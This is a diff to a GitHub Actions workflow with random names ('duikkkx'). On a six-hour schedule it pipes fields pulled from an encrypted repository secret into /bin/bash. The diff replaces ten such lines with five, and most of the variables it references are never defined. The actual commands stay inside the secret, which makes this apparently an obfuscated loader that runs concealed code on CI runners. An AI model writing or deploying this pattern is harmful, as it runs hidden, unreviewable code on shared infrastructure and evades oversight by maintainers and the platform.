@@ -2,26 +2,20 @@ name: duikkkx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 3/6 * * *'
+    - cron: '1 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: duikkkx
         env:
-          v3: ${{ secrets.v3 }}
+          y7: ${{ secrets.y7 }}
         run: |
-          echo $v3 | jq -r .fvjb9286 | /bin/bash
-          echo $f2 | jq -r .v56 | /bin/bash
-          echo $nzlhy375 | jq -r .h90 | /bin/bash
-          echo $toab4 | jq -r .wxdau4 | /bin/bash
-          echo $mvo5 | jq -r .dfn9962 | /bin/bash
-          echo $qpo9 | jq -r .pjqty38425 | /bin/bash
-          echo $e037 | jq -r .ilhm2384 | /bin/bash
-          echo $gic9 | jq -r .wqttp90 | /bin/bash
-          echo $h75233 | jq -r .zlsuk25 | /bin/bash
-          echo $lmo8444 | jq -r .bcac92429 | /bin/bash
+          echo $y7 | jq -r .yj910 | /bin/bash
+          echo $bhlj93237 | jq -r .jb2 | /bin/bash
+          echo $fzv630 | jq -r .wbetu4926 | /bin/bash
+          echo $hkbqz880 | jq -r .r0 | /bin/bash
+          echo $mf2899 | jq -r .so2933 | /bin/bash
 
